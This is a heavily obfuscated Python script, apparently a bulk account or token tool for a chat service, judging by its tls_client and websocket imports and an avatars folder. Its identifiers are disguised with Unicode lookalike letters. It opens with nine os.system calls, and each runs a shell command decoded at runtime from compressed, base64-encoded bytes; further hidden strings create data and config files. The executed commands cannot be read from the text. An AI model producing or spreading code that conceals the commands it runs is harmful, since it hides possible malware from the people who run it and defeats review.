    𝙤𝙨.system(__𝗶𝙢𝙥𝙤𝘳𝙩__(𝗹𝘔𝘐𝙄𝘔𝘭𝘔𝗡𝘐𝙄𝗡𝘔𝙡𝗹𝗜𝙈𝙡𝙈𝘭𝙄𝗠𝗜𝗠𝙄𝙉𝗠𝙄𝘭𝘭𝗹𝙉𝙡[𝗿𝙤𝙪𝘯𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝘳𝙩__(𝙡𝗠𝗜𝗜𝗠𝙡𝘔𝙉𝗜𝙄𝘕𝙈𝘭𝘭𝗜𝘔𝘭𝘔𝗹𝙄𝙈𝘐𝗠𝘐𝗡𝘔𝘐𝙡𝘭𝙡𝗡𝗹[𝗿𝘰𝙪𝗻𝗱(𝙖𝙗𝘀(0.15350906146941334 + 0.9881472400643437j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OO1\n\xcbL6\xb2\xccJ4\n3\x880\xf2+N\x0c\x0f+Mqv\xd4\xf6t75Lr\xb4\xb5\x05\x00\x90Z\x0fp')).decode())
    𝘰𝘴.system(__𝙞𝘮𝗽𝙤𝘳𝘵__(𝙡𝘔𝙄𝙄𝙈𝙡𝙈𝙉𝙄𝙄𝘕𝗠𝘭𝙡𝙄𝘔𝗹𝙈𝙡𝗜𝙈𝗜𝘔𝙄𝗡𝗠𝙄𝗹𝘭𝗹𝗡𝙡[𝙧𝗼𝘶𝙣𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝗿𝘁__(𝘭𝘔𝘐𝙄𝘔𝗹𝗠𝙉𝘐𝘐𝙉𝙈𝗹𝘭𝗜𝙈𝗹𝘔𝙡𝗜𝙈𝘐𝘔𝘐𝗡𝗠𝗜𝙡𝙡𝙡𝘕𝘭[𝙧𝗼𝘶𝙣𝘥(𝘢𝗯𝘀(0.21864710588956615 + 0.9758039982937746j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OOq\xaf\xa8\x8a0\xf2+N\x0c\x0f+Mqv\xd4\xf6t75Lr\xb4\xb5\x05\x00$\x0e\rg')).decode())
    𝘰𝘴.system(__𝗶𝙢𝘱𝘰𝘳𝘵__(𝙡𝗠𝘐𝘐𝙈𝘭𝗠𝙉𝗜𝙄𝗡𝘔𝗹𝗹𝙄𝗠𝙡𝙈𝗹𝗜𝗠𝘐𝙈𝘐𝘕𝗠𝗜𝙡𝙡𝘭𝘕𝗹[𝙧𝙤𝘶𝙣𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__(𝗹𝗠𝙄𝘐𝗠𝗹𝘔𝘕𝙄𝗜𝘕𝘔𝘭𝗹𝗜𝘔𝘭𝗠𝙡𝗜𝙈𝗜𝗠𝙄𝘕𝘔𝘐𝙡𝙡𝙡𝘕𝘭[𝙧𝘰𝙪𝙣𝙙(𝗮𝙗𝘀(0.6039244076992863 + 0.7970415985286252j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OO\xce\r\xabH\t\x0f\xabJ\xf1\xf0M\x0f\xc8t*M\t/\xb7\x05\x00\xf5x\r>')).decode())
    𝘰𝙨.system(__𝗶𝘮𝘱𝙤𝙧𝘵__(𝘭𝗠𝗜𝙄𝗠𝙡𝙈𝙉𝙄𝘐𝙉𝘔𝗹𝗹𝗜𝘔𝙡𝗠𝗹𝙄𝗠𝘐𝘔𝗜𝘕𝙈𝙄𝘭𝗹𝘭𝘕𝙡[𝗿𝙤𝘂𝙣𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝘳𝙩__(𝘭𝗠𝗜𝙄𝘔𝗹𝘔𝙉𝘐𝘐𝗡𝙈𝘭𝗹𝙄𝘔𝙡𝙈𝙡𝗜𝙈𝙄𝙈𝘐𝘕𝗠𝙄𝘭𝙡𝗹𝙉𝙡[𝙧𝙤𝘂𝙣𝙙(𝗮𝙗𝘀(0.06360326121827042 + 0.9979752628008374j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/O\x8frw3\x88\x8a\x08*H\n\x0fM\x0f\xc8t*M\t/\xb7\x05\x00\xeb\x9c\x0c\xb5')).decode())
    𝙤𝘴.system(__𝙞𝘮𝘱𝙤𝙧𝘵__(𝙡𝗠𝙄𝙄𝙈𝗹𝙈𝙉𝙄𝙄𝗡𝗠𝘭𝘭𝙄𝘔𝘭𝘔𝙡𝘐𝘔𝘐𝘔𝗜𝙉𝙈𝗜𝗹𝗹𝙡𝗡𝙡[𝙧𝙤𝘂𝗻𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝙧𝘵__(𝘭𝗠𝗜𝗜𝗠𝘭𝗠𝙉𝘐𝘐𝙉𝘔𝘭𝘭𝗜𝗠𝘭𝙈𝘭𝘐𝙈𝘐𝗠𝘐𝙉𝘔𝘐𝙡𝗹𝗹𝗡𝙡[𝙧𝙤𝘶𝗻𝘥(𝙖𝘣𝘀(0.1516505277849467 + 0.9884341745521282j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/O\x8f\n7,K\xcc\xcdN\x0f\xc8t*M\t/\xb7\x05\x00\xc0\x0e\x0b\xad')).decode())
    𝙤𝘀.system(__𝙞𝗺𝙥𝗼𝙧𝘁__(𝗹𝗠𝗜𝘐𝙈𝗹𝘔𝗡𝘐𝙄𝘕𝘔𝙡𝙡𝘐𝙈𝙡𝘔𝗹𝗜𝘔𝙄𝘔𝘐𝗡𝘔𝙄𝘭𝙡𝙡𝗡𝙡[𝙧𝗼𝘶𝙣𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝘰𝘳𝘵__(𝘭𝗠𝙄𝗜𝘔𝙡𝗠𝙉𝙄𝗜𝘕𝙈𝙡𝘭𝘐𝙈𝗹𝘔𝙡𝘐𝘔𝗜𝙈𝙄𝙉𝘔𝗜𝙡𝗹𝗹𝙉𝙡[𝗿𝗼𝙪𝘯𝗱(𝙖𝗯𝘀(0.09088503469712783 + 0.9958613911926206j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OO\x89\x08+\x88rv\xd4\xf6t75Lr\xb4\xb5\x05\x00\xb9\r\nt')).decode())
    𝙤𝘀.system(__𝘪𝙢𝙥𝘰𝘳𝙩__(𝘭𝘔𝙄𝘐𝗠𝗹𝙈𝙉𝙄𝙄𝙉𝙈𝙡𝙡𝙄𝗠𝘭𝗠𝘭𝙄𝙈𝘐𝘔𝗜𝙉𝗠𝙄𝘭𝗹𝘭𝙉𝙡[𝙧𝗼𝙪𝘯𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝘳𝘁__(𝙡𝙈𝘐𝙄𝙈𝙡𝘔𝗡𝙄𝗜𝗡𝙈𝗹𝙡𝘐𝗠𝙡𝗠𝘭𝘐𝙈𝘐𝙈𝗜𝙉𝙈𝘐𝗹𝗹𝗹𝘕𝗹[𝙧𝗼𝙪𝘯𝙙(𝘢𝗯𝘀(0.4495562590428066 + 0.8932520192842762j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OOq\xcf)\x89\nv\xd4\xf6t75Lr\xb4\xb5\x05\x00\xba&\n\x8d')).decode())
    𝘰𝘴.system(__𝗶𝗺𝘱𝘰𝘳𝘵__(𝗹𝘔𝗜𝗜𝙈𝙡𝗠𝘕𝗜𝘐𝙉𝗠𝙡𝙡𝗜𝙈𝙡𝘔𝗹𝗜𝘔𝗜𝙈𝗜𝙉𝘔𝙄𝙡𝙡𝙡𝗡𝗹[𝗿𝘰𝙪𝘯𝗱(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝗿𝙩__(𝗹𝙈𝘐𝘐𝗠𝘭𝙈𝙉𝙄𝗜𝘕𝗠𝗹𝗹𝗜𝘔𝗹𝙈𝗹𝘐𝗠𝘐𝙈𝗜𝘕𝘔𝗜𝗹𝙡𝘭𝗡𝙡[𝘳𝘰𝘶𝗻𝘥(𝘢𝘣𝙨(0.5257009565762188 + 0.8506694447638569j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OO6\x0e\xcbL\xf6\xf0*\x8b4\n\xabJ\xaet\xd4\xf6t75Lr\xb4\xb5\x05\x00 \x1e\rL')).decode())
    𝙤𝘀.system(__𝗶𝘮𝘱𝙤𝗿𝘵__(𝗹𝘔𝗜𝘐𝘔𝙡𝗠𝘕𝗜𝗜𝗡𝘔𝘭𝙡𝙄𝙈𝙡𝗠𝘭𝗜𝙈𝙄𝘔𝗜𝗡𝙈𝘐𝘭𝗹𝙡𝙉𝙡[𝘳𝙤𝘂𝘯𝗱(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝘰𝙧𝘵__(𝘭𝗠𝘐𝗜𝗠𝙡𝗠𝘕𝗜𝙄𝗡𝘔𝗹𝗹𝙄𝙈𝘭𝗠𝙡𝘐𝙈𝙄𝗠𝘐𝙉𝗠𝘐𝙡𝗹𝘭𝙉𝙡[𝙧𝘰𝘂𝘯𝗱(𝙖𝙗𝙨(0.8770597576298804 + 0.48038128767283955j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OOtw\xabJt\xaf(\x88\xcct\xd4\xf6t75Lr\xb4\xb5\x05\x00\xec\x87\x0c\x0f')).decode())
    from colorama import Fore
    from os.path import isfile, join
    from pathlib import Path
    from threading import Thread
    from time import sleep
    from tls_client import Session
    from websocket import WebSocket
    import base64
    import colorama
    import datetime
    import hashlib
    import json
    import numpy as np
    import random
    import requests
    import subprocess
    import sys
    import threading
    import time
    import tls_client
    import uuid
    import websocket
    import emoji as ej
𝘤𝙤𝗹𝗼𝙧𝘢𝘮𝘢.init()
𝙨𝘥𝙞𝗿 = 𝙤𝘀.path.dirname(𝘰𝙨.path.abspath(__𝙛𝗶𝘭𝙚__))
𝙙𝙖𝘁𝙖 = 𝗼𝘴.path.join(𝘀𝘥𝙞𝘳, __𝘪𝘮𝘱𝙤𝙧𝙩__(𝙡𝘔𝙄𝗜𝗠𝘭𝗠𝗡𝗜𝘐𝗡𝘔𝗹𝘭𝗜𝘔𝘭𝘔𝙡𝗜𝙈𝘐𝗠𝗜𝘕𝙈𝗜𝘭𝗹𝘭𝙉𝘭[𝘳𝗼𝙪𝗻𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝗿𝘁__(𝗹𝗠𝗜𝙄𝗠𝙡𝗠𝘕𝘐𝙄𝗡𝙈𝗹𝗹𝙄𝙈𝘭𝗠𝘭𝘐𝗠𝙄𝗠𝙄𝘕𝘔𝘐𝙡𝙡𝘭𝙉𝙡[𝙧𝙤𝙪𝙣𝗱(𝗮𝘣𝘴(0.08304572323339865 + 0.9965457379632114j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb4\xb5\x05\x00\nk\x02<')).decode())
𝗮𝙗𝗰 = 𝙤𝘴.path.dirname(𝙤𝘀.path.abspath(𝗱𝗮𝙩𝙖))
𝗮𝙫𝗮𝘁𝘢𝗿𝘴 = 𝙤𝘴.path.join(𝘢𝗯𝘤, __𝘪𝙢𝘱𝙤𝗿𝘵__(𝘭𝘔𝗜𝘐𝗠𝗹𝙈𝗡𝗜𝗜𝘕𝘔𝙡𝘭𝙄𝗠𝙡𝗠𝘭𝙄𝙈𝙄𝙈𝗜𝘕𝗠𝘐𝙡𝗹𝙡𝘕𝙡[𝗿𝘰𝙪𝙣𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝗿𝘁__(𝙡𝙈𝘐𝗜𝘔𝘭𝘔𝘕𝘐𝙄𝗡𝘔𝙡𝙡𝘐𝗠𝙡𝗠𝙡𝙄𝘔𝘐𝘔𝙄𝘕𝘔𝗜𝙡𝗹𝘭𝙉𝗹[𝘳𝘰𝙪𝗻𝙙(𝗮𝘣𝘴(0.9624979471973922 + 0.27128896335974656j))]).decompress(b'x\xda\x8b\x8c\x88\xcaHqw\xabL.\xb7\xb5\x05\x00\x1b\xe6\x042')).decode())
if not 𝘰𝘴.path.exists(𝗱𝘢𝘁𝘢):
    𝘰𝙨.system(__𝗶𝙢𝗽𝘰𝘳𝘁__(𝘭𝗠𝘐𝘐𝘔𝗹𝙈𝗡𝗜𝙄𝘕𝗠𝗹𝙡𝗜𝘔𝗹𝗠𝙡𝘐𝙈𝙄𝙈𝗜𝗡𝘔𝗜𝙡𝘭𝘭𝗡𝙡[𝘳𝗼𝘶𝙣𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__(𝘭𝙈𝗜𝘐𝙈𝙡𝙈𝙉𝘐𝙄𝘕𝘔𝘭𝗹𝗜𝙈𝘭𝗠𝙡𝙄𝙈𝗜𝙈𝘐𝘕𝗠𝙄𝙡𝘭𝘭𝗡𝙡[𝗿𝘰𝘂𝘯𝗱(𝘢𝘣𝙨(0.9144300029452125 + 0.40474407928173417j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xca\xcd\xa9L6\x0eL\x0fs\xcf)\x89\nv\xf2J\xca\xf33\x88\x0c\xaf(\x06\x00S\xaa\x0fG')).decode())
    𝗼𝘀.makedirs(𝙙𝗮𝙩𝙖)
    𝘰𝘴.makedirs(𝗮𝘷𝗮𝙩𝙖𝘳𝘴)
    with 𝘰𝘱𝗲𝙣(𝘰𝙨.path.join(𝙙𝘢𝘁𝗮, __𝙞𝗺𝗽𝙤𝘳𝙩__(𝗹𝘔𝘐𝘐𝘔𝘭𝘔𝗡𝗜𝗜𝘕𝗠𝙡𝘭𝙄𝘔𝗹𝙈𝗹𝗜𝙈𝙄𝗠𝙄𝗡𝙈𝗜𝙡𝗹𝘭𝘕𝗹[𝗿𝘰𝘂𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__(𝘭𝙈𝙄𝗜𝙈𝗹𝘔𝘕𝗜𝙄𝗡𝙈𝘭𝙡𝙄𝙈𝙡𝗠𝘭𝙄𝘔𝗜𝘔𝘐𝙉𝙈𝙄𝘭𝙡𝘭𝘕𝘭[𝗿𝘰𝘂𝙣𝗱(𝗮𝘣𝘴(0.836478306252422 + 0.5480000393878446j))]).decompress(b'x\xdaKq\xb7,\x8a\n7\xad\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00-\x0e\x05\x16')).decode()), __𝙞𝘮𝙥𝘰𝗿𝘵__(𝗹𝙈𝙄𝘐𝙈𝘭𝘔𝙉𝗜𝙄𝘕𝙈𝙡𝘭𝘐𝙈𝙡𝙈𝗹𝙄𝙈𝙄𝙈𝙄𝘕𝙈𝗜𝘭𝘭𝗹𝙉𝗹[𝙧𝘰𝘂𝗻𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝙧𝘵__(𝙡𝙈𝗜𝗜𝙈𝙡𝙈𝘕𝗜𝗜𝘕𝘔𝙡𝗹𝘐𝗠𝗹𝗠𝗹𝙄𝙈𝙄𝘔𝙄𝗡𝗠𝗜𝗹𝙡𝙡𝗡𝗹[𝙧𝘰𝙪𝙣𝗱(𝙖𝗯𝘴(0.6460658674947759 + 0.7632816615497995j))]).decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝗳:
        𝙛.write(__𝘪𝗺𝗽𝘰𝙧𝘁__(𝙡𝙈𝙄𝘐𝗠𝘭𝘔𝗡𝙄𝙄𝘕𝗠𝘭𝘭𝘐𝘔𝘭𝗠𝘭𝘐𝘔𝘐𝘔𝗜𝗡𝘔𝗜𝙡𝙡𝗹𝘕𝙡[𝙧𝙤𝘶𝘯𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝗿𝘁__(𝙡𝙈𝙄𝙄𝗠𝗹𝙈𝘕𝙄𝘐𝘕𝗠𝘭𝘭𝘐𝗠𝘭𝗠𝘭𝘐𝘔𝘐𝙈𝙄𝘕𝘔𝗜𝙡𝙡𝙡𝘕𝘭[𝙧𝘰𝘶𝗻𝘥(𝘢𝘣𝘴(0.8666323835599857 + 0.498947203384424j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
    with 𝘰𝘱𝗲𝗻(𝗼𝘴.path.join(𝗱𝘢𝙩𝗮, __𝙞𝗺𝙥𝙤𝘳𝘵__(𝗹𝗠𝗜𝘐𝙈𝙡𝙈𝙉𝘐𝗜𝗡𝗠𝗹𝙡𝗜𝘔𝙡𝘔𝗹𝙄𝘔𝘐𝙈𝘐𝗡𝘔𝗜𝗹𝘭𝙡𝗡𝘭[𝗿𝗼𝘶𝗻𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__(𝙡𝗠𝗜𝗜𝘔𝙡𝗠𝙉𝙄𝗜𝘕𝗠𝘭𝘭𝙄𝘔𝗹𝗠𝙡𝘐𝗠𝙄𝙈𝘐𝘕𝙈𝘐𝗹𝗹𝙡𝗡𝘭[𝘳𝗼𝘶𝘯𝗱(𝘢𝙗𝘴(0.0983086161192448 + 0.9951559757127115j))]).decompress(b'x\xdaK\xf6\xf0*Ku\xcf\xc9I\xae45H\xf5\x08\xb4\x05\x000/\x05l')).decode()), __𝘪𝙢𝘱𝘰𝙧𝙩__(𝙡𝘔𝘐𝘐𝘔𝘭𝙈𝗡𝘐𝙄𝙉𝗠𝘭𝗹𝘐𝙈𝘭𝙈𝘭𝗜𝘔𝗜𝗠𝘐𝙉𝘔𝘐𝘭𝘭𝗹𝙉𝘭[𝘳𝙤𝘶𝙣𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__(𝘭𝙈𝙄𝙄𝙈𝙡𝗠𝙉𝘐𝘐𝘕𝘔𝙡𝗹𝙄𝗠𝗹𝘔𝙡𝘐𝘔𝘐𝙈𝗜𝗡𝙈𝙄𝙡𝙡𝗹𝘕𝗹[𝙧𝙤𝘶𝗻𝙙(𝗮𝘣𝘴(0.6227130020790391 + 0.7824503288015864j))]).decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝗳:
        𝘧.write(__𝗶𝙢𝗽𝘰𝗿𝘵__(𝗹𝙈𝙄𝙄𝘔𝘭𝘔𝙉𝘐𝙄𝗡𝗠𝗹𝗹𝘐𝙈𝗹𝙈𝗹𝗜𝘔𝗜𝘔𝘐𝗡𝘔𝙄𝘭𝗹𝗹𝘕𝗹[𝗿𝘰𝘶𝙣𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝗿𝘵__(𝗹𝘔𝗜𝙄𝙈𝗹𝘔𝗡𝗜𝙄𝗡𝙈𝙡𝘭𝗜𝘔𝘭𝙈𝘭𝙄𝗠𝙄𝘔𝘐𝘕𝘔𝘐𝗹𝗹𝙡𝗡𝘭[𝙧𝘰𝙪𝗻𝘥(𝙖𝗯𝘴(0.1503628472400249 + 0.9886308786245112j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
    with 𝘰𝙥𝘦𝗻(𝗼𝙨.path.join(𝙙𝗮𝘵𝗮, __𝗶𝘮𝘱𝗼𝗿𝙩__(𝘭𝘔𝙄𝗜𝗠𝘭𝙈𝘕𝗜𝗜𝙉𝘔𝗹𝘭𝘐𝙈𝗹𝗠𝘭𝘐𝙈𝗜𝗠𝘐𝗡𝗠𝘐𝗹𝘭𝗹𝗡𝗹[𝙧𝘰𝘂𝗻𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝗿𝘁__(𝗹𝙈𝗜𝙄𝗠𝙡𝗠𝙉𝗜𝘐𝗡𝘔𝘭𝘭𝘐𝗠𝗹𝗠𝗹𝙄𝙈𝘐𝘔𝗜𝘕𝘔𝙄𝗹𝙡𝗹𝗡𝘭[𝙧𝙤𝘶𝗻𝙙(𝗮𝘣𝙨(0.20684983627135267 + 0.978372702621304j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xabL\xae45H\xf5\x08\xb4\x05\x0029\x05\x95')).decode()), __𝘪𝙢𝗽𝙤𝙧𝘵__(𝙡𝗠𝗜𝗜𝘔𝙡𝗠𝗡𝙄𝘐𝙉𝘔𝙡𝙡𝗜𝙈𝗹𝙈𝙡𝗜𝙈𝘐𝙈𝗜𝗡𝗠𝗜𝘭𝙡𝘭𝘕𝘭[𝘳𝙤𝙪𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__(𝙡𝘔𝙄𝘐𝙈𝙡𝘔𝗡𝗜𝘐𝗡𝘔𝘭𝗹𝗜𝙈𝗹𝗠𝗹𝙄𝘔𝙄𝗠𝘐𝗡𝘔𝗜𝘭𝙡𝘭𝘕𝗹[𝙧𝗼𝘶𝗻𝗱(𝘢𝗯𝙨(0.3679648768337044 + 0.9298396901707072j))]).decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝙛:
        𝗳.write(__𝘪𝗺𝗽𝙤𝘳𝙩__(𝙡𝗠𝗜𝗜𝙈𝗹𝗠𝗡𝙄𝗜𝗡𝙈𝗹𝙡𝘐𝗠𝗹𝗠𝗹𝙄𝗠𝗜𝗠𝘐𝗡𝗠𝘐𝘭𝗹𝙡𝘕𝙡[𝘳𝗼𝘶𝗻𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__(𝙡𝗠𝙄𝘐𝗠𝗹𝘔𝙉𝗜𝘐𝙉𝙈𝗹𝗹𝘐𝘔𝙡𝙈𝘭𝙄𝙈𝗜𝗠𝗜𝘕𝗠𝘐𝘭𝙡𝗹𝙉𝙡[𝙧𝗼𝙪𝘯𝙙(𝘢𝗯𝙨(0.35028224163941934 + 0.9366441966894705j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
𝙘𝙤𝘯𝙛𝘪𝗴𝙥 = 𝗼𝙨.path.join(𝘀𝘥𝗶𝘳, __𝙞𝘮𝙥𝗼𝗿𝘵__(𝗹𝘔𝗜𝘐𝙈𝗹𝗠𝗡𝗜𝗜𝘕𝗠𝘭𝙡𝘐𝘔𝗹𝘔𝗹𝘐𝙈𝙄𝗠𝘐𝘕𝙈𝘐𝙡𝙡𝘭𝗡𝘭[𝘳𝘰𝘂𝗻𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__(𝘭𝘔𝘐𝙄𝘔𝘭𝙈𝙉𝙄𝙄𝘕𝙈𝘭𝙡𝙄𝙈𝙡𝘔𝘭𝙄𝘔𝘐𝘔𝗜𝗡𝘔𝗜𝙡𝙡𝘭𝗡𝘭[𝙧𝗼𝙪𝙣𝗱(𝘢𝙗𝙨(0.3809896697045386 + 0.9245792943703782j))]).decompress(b'x\xda\x8b4\xb2,\x8d\xca\xcd\xc9\xf3\xc9-\xa8J22\xb1\x05\x00/\xba\x05\x83')).decode())
if not 𝙤𝘴.path.exists(𝙘𝘰𝗻𝙛𝗶𝙜𝙥):
    with 𝙤𝗽𝙚𝗻(𝗼𝘴.path.join(__𝗶𝗺𝗽𝙤𝘳𝘵__(𝘭𝙈𝘐𝗜𝙈𝗹𝗠𝙉𝙄𝙄𝘕𝗠𝗹𝗹𝙄𝘔𝙡𝙈𝘭𝘐𝘔𝗜𝘔𝙄𝙉𝘔𝘐𝗹𝙡𝙡𝘕𝘭[𝗿𝗼𝙪𝘯𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝙧𝙩__(𝘭𝙈𝗜𝘐𝘔𝘭𝘔𝙉𝗜𝘐𝗡𝗠𝙡𝗹𝘐𝗠𝙡𝗠𝙡𝙄𝘔𝘐𝗠𝗜𝗡𝙈𝙄𝘭𝗹𝙡𝙉𝙡[𝗿𝗼𝘂𝙣𝗱(𝘢𝘣𝘴(0.24844189379294612 + 0.9686468011657162j))]).decompress(b'x\xda\x8b4\xb2,\x8d\xca\xcd\xc9\xf3\xc9-\xa8J22\xb1\x05\x00/\xba\x05\x83')).decode()), __𝘪𝙢𝗽𝗼𝙧𝘁__(𝗹𝗠𝙄𝙄𝘔𝙡𝘔𝙉𝙄𝘐𝗡𝘔𝙡𝙡𝗜𝗠𝘭𝘔𝙡𝗜𝙈𝙄𝗠𝗜𝘕𝙈𝘐𝗹𝘭𝙡𝙉𝗹[𝘳𝙤𝘂𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__(𝘭𝗠𝙄𝙄𝘔𝗹𝗠𝙉𝘐𝘐𝙉𝗠𝗹𝘭𝗜𝘔𝘭𝘔𝘭𝗜𝙈𝗜𝙈𝘐𝗡𝘔𝙄𝙡𝙡𝗹𝘕𝙡[𝙧𝙤𝘶𝗻𝘥(𝗮𝙗𝙨(0.6452116651941318 + 0.7640038658916692j))]).decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝗳:
        𝗳.write(__𝘪𝙢𝗽𝗼𝗿𝘵__(𝘭𝗠𝗜𝘐𝗠𝘭𝗠𝘕𝙄𝘐𝗡𝙈𝗹𝗹𝗜𝘔𝗹𝗠𝗹𝘐𝙈𝘐𝘔𝙄𝙉𝘔𝙄𝙡𝘭𝘭𝘕𝘭[𝗿𝘰𝙪𝗻𝗱(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝘳𝘵__(𝗹𝘔𝙄𝘐𝗠𝘭𝙈𝙉𝘐𝘐𝗡𝘔𝗹𝗹𝘐𝙈𝘭𝘔𝗹𝙄𝗠𝘐𝙈𝘐𝘕𝘔𝙄𝙡𝗹𝙡𝙉𝙡[𝘳𝗼𝘂𝙣𝗱(𝘢𝙗𝘴(0.20224938888001087 + 0.9793340516379803j))]).decompress(b'x\xdaK\xad\xf4*O\xce\xb54I\r\xf64\xf3t\x8f\xcaH\xf2\xf0\xcb\xf1qv\xccL\xceM\xc9\xf4\xcc\xcaO\x0f\xaf\xf24\xf4\x0b.O\xf7\r\xf1-\x07\x8a\x97GD\x18\xd8\x02\x00\xdb\xee\x11\xbc')).decode())
with 𝗼𝘱𝘦𝗻(__𝙞𝗺𝗽𝘰𝗿𝘵__(𝗹𝗠𝗜𝙄𝙈𝘭𝗠𝘕𝗜𝗜𝙉𝘔𝘭𝗹𝗜𝘔𝙡𝘔𝘭𝘐𝗠𝘐𝙈𝘐𝙉𝘔𝘐𝗹𝘭𝘭𝙉𝙡[𝘳𝘰𝘂𝗻𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝘳𝘁__(𝘭𝙈𝗜𝙄𝘔𝘭𝙈𝗡𝘐𝘐𝘕𝙈𝘭𝙡𝙄𝙈𝗹𝙈𝙡𝙄𝘔𝗜𝗠𝘐𝗡𝗠𝙄𝘭𝘭𝙡𝗡𝘭[𝘳𝙤𝙪𝙣𝘥(𝘢𝘣𝙨(0.9630001827380134 + 0.26950073848980977j))]).decompress(b'x\xda\x8b4\xb2,\x8d\xca\xcd\xc9\xf3\xc9-\xa8J22\xb1\x05\x00/\xba\x05\x83')).decode(), encoding=__𝙞𝘮𝘱𝗼𝗿𝘵__(𝘭𝗠𝗜𝘐𝘔𝙡𝘔𝗡𝗜𝗜𝘕𝘔𝙡𝙡𝗜𝗠𝘭𝗠𝙡𝙄𝙈𝘐𝘔𝘐𝙉𝙈𝘐𝘭𝘭𝗹𝗡𝙡[𝙧𝙤𝘂𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__(𝙡𝘔𝙄𝗜𝘔𝗹𝘔𝘕𝘐𝘐𝗡𝘔𝗹𝘭𝗜𝘔𝘭𝘔𝙡𝗜𝘔𝘐𝘔𝙄𝙉𝘔𝙄𝘭𝘭𝘭𝘕𝙡[𝗿𝘰𝘂𝙣𝘥(𝘢𝙗𝙨(0.38502752610987634 + 0.9229050894527067j))]).decompress(b'x\xdaK\x89\x08\xca\xf5w\xb4\xb5\x05\x00\x0cS\x02\x86')).decode()) as 𝗳:
    𝗻𝘪𝗴 = 𝗷𝙨𝙤𝙣.load(𝗳)
